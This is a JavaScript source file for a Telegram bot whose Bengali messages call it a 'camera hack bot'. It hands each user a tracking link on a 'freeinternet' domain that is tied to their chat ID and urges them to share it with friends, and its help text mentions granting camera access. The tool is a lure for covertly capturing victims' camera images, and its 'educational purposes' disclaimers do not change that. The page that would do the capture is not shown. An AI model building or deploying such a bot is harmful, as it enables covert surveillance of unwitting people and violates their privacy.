const { Telegraf } = require('telegraf');

const BOT_TOKEN = process.env.BOT_TOKEN;
const bot = new Telegraf(BOT_TOKEN);

// Start command
bot.command('start', (ctx) => {
    const welcomeMessage = `
🤖 ক্যামেরা হ্যাক বটে স্বাগতম!

🌬️ *নোট:* এটি শুধুমাত্র মজা এবং শিক্ষামূলক উদ্দেশ্যে তৈরি

📝 *কমান্ড লিস্ট:*
/start - বট শুরু করুন
/create - ইউনিক লিঙ্ক তৈরি করুন
/help - সাহায্য পাবেন

📌 এখন /create টাইপ করে আপনার ইউনিক লিঙ্ক তৈরি করুন।
    `;
    
    ctx.reply(welcomeMessage, {
        parse_mode: 'Markdown'
    });
});

// Create command - Main functionality
bot.command('create', (ctx) => {
    const chatId = ctx.message.chat.id;
    const username = ctx.message.chat.username || 'user';
    const firstName = ctx.message.chat.first_name || 'User';
    
    // 🔥 FIXED DOMAIN - আপনার প্রজেক্ট নাম দিয়ে রিপ্লেস করুন
    const domain = "https://freeinternet-seven.vercel.app";
    const trackingUrl = `${domain}/track.html?chatid=${chatId}&user=${username}`;
    
    const responseMessage = `
✅ *আপনার ইউনিক ট্র্যাকিং লিঙ্ক তৈরি হয়েছে!* 🌬️

👤 *ইউজার:* ${firstName}
🆔 *চ্যাট আইডি:* ${chatId}

🔗 *আপনার লিঙ্ক:*
${trackingUrl}

⚠️ *গুরুত্বপূর্ণ নোট:*
• এই লিঙ্কটি টেলিগ্রাম ওয়েবে সম্পূর্ণ কাজ করে না
• এই লিঙ্কটি ক্রোম বা অন্য ব্রাউজারে ব্যবহার করুন ✅️

💫 *SG Modder* এর ক্ষমতা অনুভব করুন 👍

🔄 লিঙ্কটি বন্ধুদের সাথে শেয়ার করুন
    `;
    
    ctx.reply(responseMessage, {
        parse_mode: 'Markdown'
    });
});

// Help command
bot.command('help', (ctx) => {
    const helpMessage = `
📖 *বট ব্যবহার গাইড* 🌬️

*কমান্ড সমূহ:*
/start - বট শুরু করুন
/create - ইউনিক ট্র্যাকিং লিঙ্ক তৈরি করুন  
/help - এই সাহায্য মেনু দেখুন

*কিভাবে ব্যবহার করবেন:*
1. /create কমান্ড দিন
2. আপনার ইউনিক লিঙ্ক পাবেন
3. লিঙ্কটি ব্রাউজারে ওপেন করুন
4. ক্যামেরা এক্সেস দিন

🔒 *গোপনীয়তা:* এই বটটি শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে তৈরি
    `;
    
    ctx.reply(helpMessage, {
        parse_mode: 'Markdown'
    });
});

// Handle any other messages
bot.on('text', (ctx) => {
    ctx.reply(`❓ অজানা কমান্ড। /help টাইপ করে সাহায্য নিন।`);
});

// Error handling
bot.catch((err, ctx) => {
    console.error(`Error for ${ctx.updateType}:`, err);
});

// Vercel serverless function handler
module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle OPTIONS for CORS
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method === 'POST') {
        try {
            await bot.handleUpdate(req.body);
            res.status(200).json({ status: 'success' });
        } catch (error) {
            console.error('Bot error:', error);
            res.status(500).json({ 
                status: 'error', 
                message: error.message 
            });
        }
    } else {
        // GET request - show bot info
        res.status(200).json({
            status: 'Bot is running!',
            timestamp: new Date().toISOString(),
            service: 'Telegram Camera Bot',
            webhook: 'Please set webhook manually',
            domain: 'https://freeinternet.vercel.app'
        });
    }
};
